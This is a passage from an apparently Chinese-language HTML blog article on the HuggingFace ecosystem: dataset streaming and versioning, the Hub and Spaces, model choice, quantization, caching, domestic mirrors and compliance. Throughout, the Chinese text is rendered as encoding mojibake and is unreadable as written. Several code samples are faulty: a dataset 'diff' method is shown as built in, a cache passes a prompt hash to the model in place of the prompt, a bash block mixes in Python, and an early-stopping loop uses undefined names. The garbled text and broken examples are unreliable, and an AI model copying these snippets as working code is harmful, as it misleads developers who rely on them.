<p>åœ¨AIé¢†åŸŸï¼Œæœ‰ä¸€ä¸ªå…±è¯†ï¼šæ•°æ®è´¨é‡å†³å®šæ¨¡å‹ä¸Šé™ã€‚ä½†è·å–é«˜è´¨é‡æ•°æ®æ˜¯æå…¶æ˜‚è´µçš„ï¼š</p>
<ol>
<li><strong>æ ‡æ³¨æˆæœ¬</strong>ï¼šä¸€ä¸ªæƒ…æ„Ÿåˆ†ææ•°æ®é›†ï¼Œæ¯æ¡æ•°æ®æ ‡æ³¨æˆæœ¬0.5å…ƒï¼Œ100ä¸‡æ¡å°±æ˜¯50ä¸‡å…ƒ</li>
<li><strong>æ¸…æ´—æˆæœ¬</strong>ï¼šåŸå§‹æ•°æ®ä¸­å¯èƒ½æœ‰30%çš„å™ªå£°ï¼Œæ¸…æ´—åˆæ˜¯ä¸€å¤§ç¬”å¼€é”€</li>
<li><strong>åˆè§„æˆæœ¬</strong>ï¼šç”¨æˆ·æ•°æ®æ¶‰åŠéšç§ï¼Œéœ€è¦è„±æ•ã€åŠ å¯†ã€åˆè§„å®¡æŸ¥</li>
</ol>
<p>HuggingFace Datasetsçš„ä»·å€¼åœ¨äºï¼šå®ƒå»ºç«‹äº†ä¸€ä¸ª<strong>æ•°æ®å…±äº«ç»æµ</strong>ã€‚</p>
<h3 data-id="heading-10">3.2 æµå¼å¤„ç†ï¼šè®©å¤§æ•°æ®é›†åœ¨â€œå°å†…å­˜â€ä¸­è¿è¡Œ</h3>
<p>ä¼ ç»Ÿçš„æ•°æ®åŠ è½½æ–¹å¼ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-comment"># åŠ è½½100GBçš„æ–‡æœ¬æ•°æ®ï¼Ÿç›´æ¥å†…å­˜çˆ†ç‚¸</span>
data = pd.read_csv(<span class="hljs-string">"100gb_text.csv"</span>)
</code></pre>
<p>Datasetsçš„æµå¼åŠ è½½ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> datasets <span class="hljs-keyword">import</span> load_dataset
<span class="hljs-comment"># æµå¼åŠ è½½ï¼Œå†…å­˜ä¸­åªä¿ç•™å½“å‰æ‰¹æ¬¡</span>
dataset = load_dataset(<span class="hljs-string">"big_corpus"</span>, streaming=<span class="hljs-literal">True</span>)
<span class="hljs-keyword">for</span> batch <span class="hljs-keyword">in</span> dataset.<span class="hljs-built_in">iter</span>(batch_size=<span class="hljs-number">1000</span>):
    process(batch)  <span class="hljs-comment"># å¤„ç†å½“å‰æ‰¹æ¬¡</span>
</code></pre>
<p>æ›´æ™ºèƒ½çš„æ˜¯<strong>å†…å­˜æ˜ å°„ï¼ˆMemory Mappingï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•°æ®é›†çœ‹èµ·æ¥åƒåœ¨å†…å­˜ä¸­ï¼Œå®é™…åœ¨ç£ç›˜ä¸Š</span>
dataset = load_dataset(<span class="hljs-string">"big_corpus"</span>)
<span class="hljs-comment"># é¦–æ¬¡è®¿é—®ä¼šæ…¢ï¼Œåç»­è®¿é—®æœ‰ç¼“å­˜</span>
</code></pre>
<h3 data-id="heading-11">3.3 æ•°æ®ç‰ˆæœ¬æ§åˆ¶ï¼šAIçš„â€œGitâ€</h3>
<p>æ•°æ®ä¸æ˜¯é™æ€çš„ã€‚ä»Šå¤©å‡†ç¡®çš„æ•°æ®ï¼Œæ˜å¤©å¯èƒ½å°±è¿‡æ—¶äº†ã€‚æ•°æ®ç‰ˆæœ¬æ§åˆ¶å› æ­¤å˜å¾—è‡³å…³é‡è¦ã€‚</p>
<p>Datasetsåº“å†…ç½®äº†ç‰ˆæœ¬æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŠ è½½ç‰¹å®šç‰ˆæœ¬</span>
dataset_v1 = load_dataset(<span class="hljs-string">"my_dataset"</span>, revision=<span class="hljs-string">"v1.0"</span>)
dataset_v2 = load_dataset(<span class="hljs-string">"my_dataset"</span>, revision=<span class="hljs-string">"v2.0"</span>)

<span class="hljs-comment"># æ¯”è¾ƒä¸åŒç‰ˆæœ¬</span>
diff = dataset_v1.diff(dataset_v2)
</code></pre>
<p>è¿™è§£å†³äº†AIå¼€å‘ä¸­çš„ä¸€ä¸ªå¤§ç—›ç‚¹ï¼š<strong>å¯å¤ç°æ€§</strong>ã€‚ä¸‰å¹´å‰è®­ç»ƒçš„æ¨¡å‹ï¼Œä»Šå¤©è¿˜èƒ½ç”¨åŒæ ·çš„æ•°æ®é‡æ–°è®­ç»ƒå—ï¼Ÿæœ‰äº†æ•°æ®ç‰ˆæœ¬æ§åˆ¶ï¼Œç­”æ¡ˆæ˜¯å¯ä»¥ã€‚</p>
<h2 data-id="heading-12">ç¬¬å››éƒ¨åˆ†ï¼šHuggingFace Hubâ€”â€”ä¸åªæ˜¯æ¨¡å‹ä»“åº“</h2>
<h3 data-id="heading-13">4.1 æ¨¡å‹å‘ç°çš„â€œApp Storeâ€</h3>
<p>HuggingFace Hubä¸Šæœ‰è¶…è¿‡50ä¸‡ä¸ªæ¨¡å‹ã€‚å¦‚ä½•æ‰¾åˆ°ä½ éœ€è¦çš„ï¼ŸHubæä¾›äº†å¤šç»´åº¦çš„å‘ç°æœºåˆ¶ï¼š</p>
<p><strong>æŒ‰ä»»åŠ¡ç­›é€‰</strong>ï¼šæ–‡æœ¬åˆ†ç±»ã€æ–‡æœ¬ç”Ÿæˆã€å›¾åƒåˆ†ç±»ã€è¯­éŸ³è¯†åˆ«...
<strong>æŒ‰è¯­è¨€ç­›é€‰</strong>ï¼šä¸­æ–‡ã€è‹±æ–‡ã€å¤šè¯­è¨€...
<strong>æŒ‰è®¸å¯è¯ç­›é€‰</strong>ï¼šå•†ç”¨ã€ç ”ç©¶ç”¨ã€å¼€æº...
<strong>æŒ‰å¤§å°ç­›é€‰</strong>ï¼š&lt;100Mã€100M-1Bã€&gt;1B...
<strong>æŒ‰æµè¡Œåº¦ç­›é€‰</strong>ï¼šä¸‹è½½é‡ã€ç‚¹èµæ•°ã€è¿‘æœŸæ´»è·ƒåº¦</p>
<p>æ›´é‡è¦çš„æ˜¯**æ¨¡å‹å¡ç‰‡ï¼ˆModel Cardï¼‰**ç³»ç»Ÿã€‚æ¯ä¸ªæ¨¡å‹éƒ½æœ‰è¯¦ç»†çš„æ–‡æ¡£ï¼š</p>
<ul>
<li>è®­ç»ƒæ•°æ®æ˜¯ä»€ä¹ˆ</li>
<li>åœ¨å“ªäº›åŸºå‡†æµ‹è¯•ä¸Šè¡¨ç°å¦‚ä½•</li>
<li>æœ‰ä»€ä¹ˆå·²çŸ¥ç¼ºé™·ï¼ˆåè§ã€å¹»è§‰ç­‰ï¼‰</li>
<li>å¦‚ä½•ä½¿ç”¨ç¤ºä¾‹ä»£ç </li>
</ul>
<h3 data-id="heading-14">4.2 Spacesï¼šé›¶åç«¯éƒ¨ç½²AIåº”ç”¨</h3>
<p>ä¼ ç»ŸAIåº”ç”¨éƒ¨ç½²ï¼š</p>
<ol>
<li>è´­ä¹°äº‘æœåŠ¡å™¨</li>
<li>é…ç½®GPUç¯å¢ƒ</li>
<li>éƒ¨ç½²æ¨¡å‹æœåŠ¡</li>
<li>å¼€å‘å‰ç«¯ç•Œé¢</li>
<li>é…ç½®è´Ÿè½½å‡è¡¡</li>
<li>ç›‘æ§å’Œè¿ç»´</li>
</ol>
<p>Spacesè®©è¿™ä¸€åˆ‡å˜å¾—ç®€å•ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> gradio <span class="hljs-keyword">as</span> gr
<span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> pipeline

generator = pipeline(<span class="hljs-string">"text-generation"</span>, <span class="hljs-string">"gpt2"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_text</span>(<span class="hljs-params">prompt</span>):
    <span class="hljs-keyword">return</span> generator(prompt, max_length=<span class="hljs-number">100</span>)[<span class="hljs-number">0</span>][<span class="hljs-string">'generated_text'</span>]

gr.Interface(fn=generate_text, inputs=<span class="hljs-string">"text"</span>, outputs=<span class="hljs-string">"text"</span>).launch()
</code></pre>
<p>ä¸Šä¼ åˆ°Spacesï¼Œä½ å°±å¾—åˆ°äº†ï¼š</p>
<ul>
<li>ä¸€ä¸ªæ°¸ä¹…åœ¨çº¿çš„Webåº”ç”¨</li>
<li>å…è´¹çš„GPUèµ„æºï¼ˆæœ‰é™æ—¶é•¿ï¼‰</li>
<li>è‡ªåŠ¨HTTPSè¯ä¹¦</li>
<li>è®¿é—®é‡ç»Ÿè®¡</li>
<li>ç¤¾åŒºåé¦ˆç³»ç»Ÿ</li>
</ul>
<h3 data-id="heading-15">4.3 åä½œä¸ç¤¾åŒºï¼šå¼€æºAIçš„é£è½®æ•ˆåº”</h3>
<p>HuggingFaceæœ€å¼ºå¤§çš„ä¸æ˜¯æŠ€æœ¯ï¼Œè€Œæ˜¯<strong>ç¤¾åŒº</strong>ã€‚</p>
<p><strong>å¼€æºè´¡çŒ®çš„é£è½®</strong>ï¼š</p>
<ol>
<li>ç ”ç©¶è€…å¼€æºæ¨¡å‹ â†’ 2. å¼€å‘è€…ä½¿ç”¨å¹¶åé¦ˆé—®é¢˜ â†’ 3. ç ”ç©¶è€…æ”¹è¿›æ¨¡å‹ â†’ 4. æ›´å¤šå¼€å‘è€…åŠ å…¥</li>
</ol>
<p><strong>ä¼ä¸šå‚ä¸çš„å…±èµ¢</strong>ï¼š</p>
<ul>
<li>å¤§å…¬å¸å¼€æºâ€œåŸºåº§æ¨¡å‹â€</li>
<li>ä¸­å°ä¼ä¸šåœ¨åŸºåº§ä¸Šå¾®è°ƒâ€œå‚ç›´æ¨¡å‹â€</li>
<li>åˆ›ä¸šå…¬å¸åŸºäºæ¨¡å‹æ„å»ºåº”ç”¨</li>
<li>æ‰€æœ‰äººéƒ½ä»ç”Ÿæ€å¢é•¿ä¸­å—ç›Š</li>
</ul>
<h2 data-id="heading-16">ç¬¬äº”éƒ¨åˆ†ï¼šå®æˆ˜æŒ‡å—â€”â€”ä»å®éªŒåˆ°ç”Ÿäº§</h2>
<h3 data-id="heading-17">5.1 æ¨¡å‹é€‰æ‹©ï¼šæ²¡æœ‰æœ€å¥½ï¼Œåªæœ‰æœ€åˆé€‚</h3>
<p>é€‰æ‹©æ¨¡å‹çš„å†³ç­–æ¡†æ¶ï¼š</p>
<p><strong>åœºæ™¯ä¸€ï¼šèŠå¤©æœºå™¨äºº</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># éœ€è¦è¾ƒå¼ºçš„æ¨ç†å’Œå¯¹è¯èƒ½åŠ›</span>
<span class="hljs-comment"># æ¨èï¼šQwenã€ChatGLMã€DeepSeek</span>
model = <span class="hljs-string">"Qwen/Qwen2.5-7B-Instruct"</span>
</code></pre>
<p><strong>åœºæ™¯äºŒï¼šæ–‡æœ¬åµŒå…¥</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># éœ€è¦å°†æ–‡æœ¬è½¬æ¢ä¸ºå‘é‡</span>
<span class="hljs-comment"># æ¨èï¼šBGEã€text2vec</span>
model = <span class="hljs-string">"BAAI/bge-large-zh"</span>
</code></pre>
<p><strong>åœºæ™¯ä¸‰ï¼šä»£ç ç”Ÿæˆ</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># éœ€è¦ç†è§£ç¼–ç¨‹è¯­è¨€</span>
<span class="hljs-comment"># æ¨èï¼šCodeLlamaã€DeepSeek-Coder</span>
model = <span class="hljs-string">"codellama/CodeLlama-7b"</span>
</code></pre>
<p><strong>åœºæ™¯å››ï¼šè¾¹ç¼˜éƒ¨ç½²</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># éœ€è¦åœ¨èµ„æºå—é™è®¾å¤‡ä¸Šè¿è¡Œ</span>
<span class="hljs-comment"># æ¨èï¼šé‡åŒ–åçš„å°æ¨¡å‹</span>
model = <span class="hljs-string">"microsoft/phi-2"</span>  <span class="hljs-comment"># ä»…2.7Bå‚æ•°</span>
</code></pre>
<h3 data-id="heading-18">5.2 æ€§èƒ½ä¼˜åŒ–ï¼šè®©æ¨ç†é€Ÿåº¦é£èµ·æ¥</h3>
<p><strong>æŠ€å·§ä¸€ï¼šé‡åŒ–</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModelForCausalLM, BitsAndBytesConfig
<span class="hljs-keyword">import</span> torch

bnb_config = BitsAndBytesConfig(
    load_in_4bit=<span class="hljs-literal">True</span>,
    bnb_4bit_compute_dtype=torch.float16,
    bnb_4bit_quant_type=<span class="hljs-string">"nf4"</span>,
)

model = AutoModelForCausalLM.from_pretrained(
    <span class="hljs-string">"æ¨¡å‹åç§°"</span>,
    quantization_config=bnb_config,
)
<span class="hljs-comment"># æ˜¾å­˜å‡å°‘75%ï¼Œé€Ÿåº¦æå‡2-3å€</span>
</code></pre>
<p><strong>æŠ€å·§äºŒï¼šç¼“å­˜æ³¨æ„åŠ›ï¼ˆKV Cacheï¼‰</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è‡ªå›å½’ç”Ÿæˆæ—¶ï¼Œç¼“å­˜ä¹‹å‰çš„æ³¨æ„åŠ›ç»“æœ</span>
generator = pipeline(<span class="hljs-string">"text-generation"</span>, model=model)
result = generator(
    prompt,
    max_length=<span class="hljs-number">100</span>,
    use_cache=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># å¯ç”¨KVç¼“å­˜</span>
)
<span class="hljs-comment"># é€Ÿåº¦æå‡30-50%</span>
</code></pre>
<p><strong>æŠ€å·§ä¸‰ï¼šæ‰¹å¤„ç†</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŒæ—¶å¤„ç†å¤šä¸ªè¯·æ±‚</span>
prompts = [<span class="hljs-string">"æç¤º1"</span>, <span class="hljs-string">"æç¤º2"</span>, <span class="hljs-string">"æç¤º3"</span>, <span class="hljs-string">"æç¤º4"</span>]
results = generator(prompts, batch_size=<span class="hljs-number">4</span>)
<span class="hljs-comment"># GPUåˆ©ç”¨ç‡ä»30%æå‡åˆ°80%</span>
</code></pre>
<h3 data-id="heading-19">5.3 æˆæœ¬æ§åˆ¶ï¼šè®©AIç”¨å¾—èµ·</h3>
<p><strong>ç­–ç•¥ä¸€ï¼šåˆ†å±‚å¤„ç†</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç®€å•é—®é¢˜ç”¨å°æ¨¡å‹ï¼Œå¤æ‚é—®é¢˜ç”¨å¤§æ¨¡å‹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">smart_router</span>(<span class="hljs-params">question</span>):
    <span class="hljs-keyword">if</span> is_simple_question(question):
        <span class="hljs-keyword">return</span> small_model(question)  <span class="hljs-comment"># å…è´¹æˆ–ä½æˆæœ¬</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> large_model(question)  <span class="hljs-comment"># é«˜æˆæœ¬ä½†èƒ½åŠ›å¼º</span>
</code></pre>
<p><strong>ç­–ç•¥äºŒï¼šç¼“å­˜ç»“æœ</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> lru_cache
<span class="hljs-keyword">import</span> hashlib

<span class="hljs-meta">@lru_cache(<span class="hljs-params">maxsize=<span class="hljs-number">10000</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cached_response</span>(<span class="hljs-params">prompt</span>):
    <span class="hljs-comment"># ç›¸åŒæç¤ºè¯ç›´æ¥è¿”å›ç¼“å­˜</span>
    <span class="hljs-keyword">return</span> model(prompt)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_with_cache</span>(<span class="hljs-params">prompt</span>):
    prompt_hash = hashlib.md5(prompt.encode()).hexdigest()
    <span class="hljs-keyword">return</span> get_cached_response(prompt_hash)
</code></pre>
<p><strong>ç­–ç•¥ä¸‰ï¼šæå‰ç»ˆæ­¢</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å½“ç”Ÿæˆè´¨é‡è¶³å¤Ÿå¥½æ—¶æå‰åœæ­¢</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_with_early_stopping</span>(<span class="hljs-params">prompt, quality_threshold=<span class="hljs-number">0.95</span></span>):
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(max_length):
        token = generate_next_token()
        current_quality = calculate_quality()
        <span class="hljs-keyword">if</span> current_quality &gt; quality_threshold:
            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># æå‰ç»ˆæ­¢ï¼ŒèŠ‚çœè®¡ç®—</span>
    <span class="hljs-keyword">return</span> generated_text
</code></pre>
<h2 data-id="heading-20">ç¬¬å…­éƒ¨åˆ†ï¼šä¸­å›½å¼€å‘è€…çš„ç‰¹åˆ«æŒ‡å—</h2>
<h3 data-id="heading-21">6.1 ç½‘ç»œé—®é¢˜ï¼šä¸æ­¢æ˜¯â€œç§‘å­¦ä¸Šç½‘â€</h3>
<p>å¯¹äºä¸­å›½å¼€å‘è€…ï¼Œè®¿é—®HuggingFaceçš„æœ€å¤§éšœç¢æ˜¯ç½‘ç»œã€‚è§£å†³æ–¹æ¡ˆï¼š</p>
<p><strong>æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨å›½å†…é•œåƒ</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="hljs-built_in">export</span> HF_ENDPOINT=https://hf-mirror.com

<span class="hljs-comment"># æˆ–è€…åœ¨ä»£ç ä¸­è®¾ç½®</span>
import os
os.environ[<span class="hljs-string">'HF_ENDPOINT'</span>] = <span class="hljs-string">'https://hf-mirror.com'</span>
</code></pre>
<p><strong>æ–¹æ¡ˆäºŒï¼šModelScopeï¼ˆé­”æ­ç¤¾åŒºï¼‰</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># é˜¿é‡Œäº‘æä¾›çš„å›½å†…æ›¿ä»£</span>
<span class="hljs-keyword">from</span> modelscope <span class="hljs-keyword">import</span> AutoModelForCausalLM, AutoTokenizer

model = AutoModelForCausalLM.from_pretrained(<span class="hljs-string">"qwen/Qwen2.5-7B"</span>)
<span class="hljs-comment"># å®Œå…¨å…¼å®¹HuggingFace APIï¼Œé€Ÿåº¦æ›´å¿«</span>
</code></pre>
<p><strong>æ–¹æ¡ˆä¸‰ï¼šæå‰ç¼“å­˜</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åœ¨æœ‰ç½‘ç»œæ—¶ä¸‹è½½æ‰€æœ‰ä¾èµ–</span>
<span class="hljs-keyword">from</span> huggingface_hub <span class="hljs-keyword">import</span> snapshot_download

<span class="hljs-comment"># ä¸‹è½½æ¨¡å‹å’Œæ‰€æœ‰ä¾èµ–</span>
snapshot_download(
    repo_id=<span class="hljs-string">"Qwen/Qwen2.5-7B"</span>,
    local_dir=<span class="hljs-string">"./local_qwen"</span>,
    ignore_patterns=[<span class="hljs-string">"*.msgpack"</span>, <span class="hljs-string">"*.h5"</span>],  <span class="hljs-comment"># è·³è¿‡ä¸å¿…è¦æ–‡ä»¶</span>
)
</code></pre>
<h3 data-id="heading-22">6.2 ä¸­æ–‡ä¼˜åŒ–æ¨¡å‹æ¨è</h3>
<p><strong>é€šç”¨å¯¹è¯</strong>ï¼š</p>
<ul>
<li>Qwenç³»åˆ—ï¼ˆé˜¿é‡Œé€šä¹‰ï¼‰ï¼šä¸­æ–‡ä¼˜åŒ–å¥½ï¼Œå¼€æºåè®®å‹å¥½</li>
<li>ChatGLMç³»åˆ—ï¼ˆæ™ºè°±ï¼‰ï¼šä¸­æ–‡èƒ½åŠ›å¼ºï¼Œæ¨ç†é€Ÿåº¦å¿«</li>
<li>DeepSeekï¼ˆæ·±åº¦æ±‚ç´¢ï¼‰ï¼šæ•°å­¦å’Œæ¨ç†èƒ½åŠ›å¼º</li>
</ul>
<p><strong>æ–‡æœ¬åµŒå…¥</strong>ï¼š</p>
<ul>
<li>BGEç³»åˆ—ï¼ˆæ™ºæºï¼‰ï¼šä¸­æ–‡æ–‡æœ¬åµŒå…¥SOTA</li>
<li>text2vecï¼ˆéƒå¸…ï¼‰ï¼šè½»é‡çº§ï¼Œé€‚åˆéƒ¨ç½²</li>
</ul>
<p><strong>ä»£ç ç”Ÿæˆ</strong>ï¼š</p>
<ul>
<li>DeepSeek-Coderï¼šä¸­æ–‡ä»£ç æ³¨é‡Šç†è§£å¥½</li>
<li>CodeQwenï¼šåŸºäºQwençš„ä»£ç æ¨¡å‹</li>
</ul>
<h3 data-id="heading-23">6.3 åˆè§„ä¸å®‰å…¨ï¼šåœ¨ä¸­å›½åšAIå¿…é¡»è€ƒè™‘çš„</h3>
<p><strong>æ•°æ®ä¸å‡ºå¢ƒ</strong>ï¼šä½¿ç”¨å›½å†…æ¨¡å‹æˆ–æœ¬åœ°éƒ¨ç½²
<strong>å†…å®¹å®¡æ ¸</strong>ï¼šå¢åŠ æ•æ„Ÿè¯è¿‡æ»¤å±‚
<strong>ç”¨æˆ·éšç§</strong>ï¼šå¯¹è¯è®°å½•åŠ å¯†å­˜å‚¨
<strong>å¤‡æ¡ˆè¦æ±‚</strong>ï¼šAIç”Ÿæˆå†…å®¹éœ€æ ‡æ³¨â€œç”±AIç”Ÿæˆâ€</p>
<h2 data-id="heading-24">ç¬¬ä¸ƒéƒ¨åˆ†ï¼šæœªæ¥å±•æœ›â€”â€”HuggingFaceçš„ä¸‹ä¸€ä¸ªäº”å¹´</h2>
<h3 data-id="heading-25">7.1 å¤šæ¨¡æ€ç»Ÿä¸€ï¼šæ–‡æœ¬ã€å›¾åƒã€è¯­éŸ³çš„èåˆ</h3>
<p>å½“å‰çš„å¤šæ¨¡æ€æ¨¡å‹è¿˜æ˜¯â€œæ‹¼å‡‘å¼â€çš„ï¼šæ–‡æœ¬ä¸€ä¸ªæ¨¡å‹ï¼Œå›¾åƒä¸€ä¸ªæ¨¡å‹ï¼Œè¯­éŸ³ä¸€ä¸ªæ¨¡å‹ã€‚æœªæ¥è¶‹åŠ¿æ˜¯<strong>çœŸæ­£çš„å¤šæ¨¡æ€ç»Ÿä¸€æ¨¡å‹</strong>ã€‚</p>
<p>HuggingFaceå·²ç»åœ¨å¸ƒå±€ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æœªæ¥çš„APIå¯èƒ½æ˜¯è¿™æ ·çš„</span>
<span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> MultiModalModel

model = MultiModalModel.from_pretrained(<span class="hljs-string">"unified-model-v1"</span>)

<span class="hljs-comment"># åŒæ—¶å¤„ç†æ–‡æœ¬ã€å›¾åƒã€è¯­éŸ³</span>
result = model({
    <span class="hljs-string">"text"</span>: <span class="hljs-string">"æè¿°è¿™å¼ å›¾ç‰‡"</span>,
    <span class="hljs-string">"image"</span>: image_data,
    <span class="hljs-string">"audio"</span>: audio_data
})
</code></pre>
<h3 data-id="heading-26">7.2 æ™ºèƒ½ä½“ï¼ˆAgentï¼‰ç”Ÿæ€ï¼šä»å·¥å…·åˆ°åŠ©æ‰‹</h3>
<p>å¤§æ¨¡å‹æœ¬èº«åªæ˜¯â€œå¤§è„‘â€ï¼Œæ™ºèƒ½ä½“æ˜¯â€œå¤§è„‘+æ‰‹è„šâ€ã€‚</p>
<p>HuggingFaceå¯èƒ½ä¼šæ¨å‡ºï¼š</p>
<ul>
<li><strong>å·¥å…·è°ƒç”¨æ ‡å‡†åŒ–</strong>ï¼šç»Ÿä¸€å„APIçš„è°ƒç”¨æ–¹å¼</li>
<li><strong>å·¥ä½œæµç¼–æ’</strong>ï¼šå¯è§†åŒ–æ„å»ºæ™ºèƒ½ä½“æµç¨‹</li>
<li><strong>è®°å¿†ç³»ç»Ÿ</strong>ï¼šé•¿æœŸè®°å¿†å’ŒçŸ­æœŸè®°å¿†ç®¡ç†</li>
<li><strong>è‡ªæˆ‘åæ€</strong>ï¼šæ™ºèƒ½ä½“è¯„ä¼°å’Œæ”¹è¿›è‡ªèº«è¡Œä¸º</li>
</ul>
<h3 data-id="heading-27">7.3 è¾¹ç¼˜AIï¼šè®©å¤§æ¨¡å‹åœ¨æ‰‹æœºä¸Šè¿è¡Œ</h3>
<p>å½“å‰é™åˆ¶ï¼š70Bæ¨¡å‹éœ€è¦8å¼ A100
æœªæ¥è¶‹åŠ¿ï¼šé€šè¿‡æ¨¡å‹å‹ç¼©ã€è’¸é¦ã€ä¸“ç”¨èŠ¯ç‰‡ï¼Œè®©7Bæ¨¡å‹åœ¨æ‰‹æœºä¸Šæµç•…è¿è¡Œ</p>
<p>æŠ€æœ¯è·¯å¾„ï¼š</p>
<ol>
<li><strong>æ¨¡å‹è’¸é¦</strong>ï¼šå¤§æ¨¡å‹â†’å°æ¨¡å‹ï¼Œä¿æŒ90%èƒ½åŠ›</li>
<li><strong>ç¨€ç–åŒ–</strong>ï¼šç§»é™¤ä¸é‡è¦çš„ç¥ç»å…ƒ</li>
<li><strong>ç¡¬ä»¶ååŒ</strong>ï¼šä¸“ç”¨AIèŠ¯ç‰‡ï¼ˆNPUï¼‰æ™®åŠ</li>
</ol>
<h2 data-id="heading-28">ç»“è¯­ï¼šæˆ‘ä»¬æ­£ç«™åœ¨AIæ°‘ä¸»åŒ–çš„æ‹ç‚¹ä¸Š</h2>
<p>å›æœ›AIå‘å±•çš„å†å²ï¼š</p>
<ul>
<li>2012å¹´ï¼ŒAlexNetè®©è®¡ç®—æœºè§†è§‰èµ°å‡ºå®éªŒå®¤</li>
<li>2017å¹´ï¼ŒTransformerè®©è‡ªç„¶è¯­è¨€å¤„ç†è¿æ¥çªç ´</li>
<li>2022å¹´ï¼ŒChatGPTè®©å¤§æ¨¡å‹èµ°è¿›å…¬ä¼—è§†é‡</li>
<li>2024å¹´ï¼Œå¼€æºæ¨¡å‹è®©æŠ€æœ¯ä¸å†è¢«å·¨å¤´å„æ–­</li>
</ul>
<p>è€ŒHuggingFaceï¼Œæ­£æ˜¯åœ¨è¿™ä¸ªå…³é”®æ—¶åˆ»ï¼Œä¸ºæ•´ä¸ªç”Ÿæ€æä¾›äº†åŸºç¡€è®¾æ–½ã€‚</p>
<p>å®ƒåšçš„ä¸æ˜¯æœ€å‰æ²¿çš„ç ”ç©¶ï¼Œä¹Ÿä¸æ˜¯æœ€ç‚«é…·çš„äº§å“ï¼Œè€Œæ˜¯<strong>æœ€åŸºç¡€ã€æœ€å¿…è¦ã€æœ€å®¹æ˜“è¢«å¿½è§†çš„å·¥ç¨‹å·¥ä½œ</strong>ï¼šç»Ÿä¸€æ¥å£ã€æ ‡å‡†åŒ–æµç¨‹ã€å»ºç«‹ç¤¾åŒºã€‚</p>
<p>ç°åœ¨ï¼Œå¤§æ¨¡å‹çš„å£å’å·²ç»ä»â€œèƒ½ä¸èƒ½åšâ€å˜æˆäº†â€œæƒ³ä¸æƒ³åšâ€ã€‚ä»»ä½•ä¸€ä¸ªæœ‰PythonåŸºç¡€çš„å¼€å‘è€…ï¼Œéƒ½èƒ½åœ¨å‡ å¤©å†…æ­å»ºä¸€ä¸ªå¯ç”¨çš„AIåº”ç”¨ã€‚ä»»ä½•ä¸€ä¸ªä¸­å°ä¼ä¸šï¼Œéƒ½èƒ½ç”¨æœ‰é™çš„é¢„ç®—éƒ¨ç½²è‡ªå·±çš„æ™ºèƒ½å®¢æœã€‚</p>
<p>è¿™å°±æ˜¯æŠ€æœ¯æ°‘ä¸»åŒ–çš„åŠ›é‡ï¼šå½“å·¥å…·å˜å¾—è¶³å¤Ÿç®€å•ï¼Œåˆ›é€ åŠ›å°±ä¼šä»ä¸­å¿ƒæµå‘è¾¹ç¼˜ï¼Œä»å·¨å¤´æµå‘å¤§ä¼—ã€‚</p>
<p>æ‰€ä»¥ï¼Œå¦‚æœä½ è¿˜åœ¨è§‚æœ›ï¼Œè¿˜åœ¨çŠ¹è±«ï¼Œè¿˜åœ¨è§‰å¾—â€œAIç¦»æˆ‘å¾ˆè¿œâ€ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯æœ€å¥½çš„èµ·ç‚¹ã€‚æ‰“å¼€HuggingFaceï¼Œä»ç¬¬ä¸€ä¸ª<code>pipeline()</code>è°ƒç”¨å¼€å§‹ã€‚</p>
<p>å› ä¸ºæœªæ¥ä¸æ˜¯ç­‰æ¥çš„ï¼Œæ˜¯æ„å»ºå‡ºæ¥çš„ã€‚è€Œæ„å»ºæœªæ¥çš„å·¥å…·ï¼Œç°åœ¨å°±åœ¨ä½ æ‰‹ä¸­ã€‚</p>
<blockquote>
<p>æ°´å¹³æœ‰é™ï¼Œè¿˜ä¸èƒ½å†™åˆ°å°½å–„å°½ç¾ï¼Œå¸Œæœ›å¤§å®¶å¤šå¤šäº¤æµï¼Œè·Ÿæ˜¥é‡ä¸€åŒè¿›æ­¥ï¼ï¼ï¼</p>
